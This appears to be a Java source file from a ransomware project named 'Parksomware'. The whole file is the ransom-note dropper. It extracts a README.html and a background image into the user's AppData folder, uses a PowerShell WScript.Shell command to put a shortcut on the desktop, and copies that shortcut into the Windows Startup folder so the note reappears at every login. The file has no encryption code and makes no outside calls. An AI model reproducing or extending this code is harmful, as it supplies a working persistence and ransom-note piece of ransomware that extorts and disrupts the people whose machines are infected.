package kr.pah;

import java.awt.Desktop;
import java.io.*;
import java.nio.file.*;

public class CreateReadme {

    private static final String PARKSOMWARE_DIR = System.getenv("APPDATA") + "\\Parksomware";

    public static void main() {
        try {
            Path parksomwarePath = Paths.get(PARKSOMWARE_DIR);
            if (!Files.exists(parksomwarePath)) {
                Files.createDirectories(parksomwarePath);
            }

            Path readmePath = extractFileToAppData("/README.html");
            Path backgroundPath = extractFileToAppData("/background.png");

            Path desktopShortcut = addToDesktopShortcut(readmePath);
            addToStartup(desktopShortcut);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static Path extractFileToAppData(String resourceFileName) throws IOException {
        Path filePath = Paths.get(PARKSOMWARE_DIR, resourceFileName.substring(1)); // Remove the leading "/"
        try (InputStream is = CreateReadme.class.getResourceAsStream(resourceFileName)) {
            if (is == null) {
                throw new FileNotFoundException(resourceFileName + " not found in Jar file.");
            }
            Files.copy(is, filePath, StandardCopyOption.REPLACE_EXISTING);
        }
        return filePath;
    }

    private static Path addToDesktopShortcut(Path filePath) throws IOException {
        Path desktopPath = Paths.get(System.getenv("USERPROFILE"), "Desktop");
        Path shortcutPath = desktopPath.resolve(filePath.getFileName().toString() + ".lnk");

        String script = "powershell \"$s = (New-Object -COM WScript.Shell).CreateShortcut('" + shortcutPath.toString() + "'); "
                + "$s.TargetPath = '" + filePath.toString() + "'; $s.Save()\"";

        Runtime.getRuntime().exec(script);
        return shortcutPath;
    }

    private static void addToStartup(Path shortcutPath) throws IOException {
        String startupFolderPath = System.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
        Path startupShortcutPath = Paths.get(startupFolderPath, shortcutPath.getFileName().toString());

        Files.copy(shortcutPath, startupShortcutPath, StandardCopyOption.REPLACE_EXISTING);
    }
}
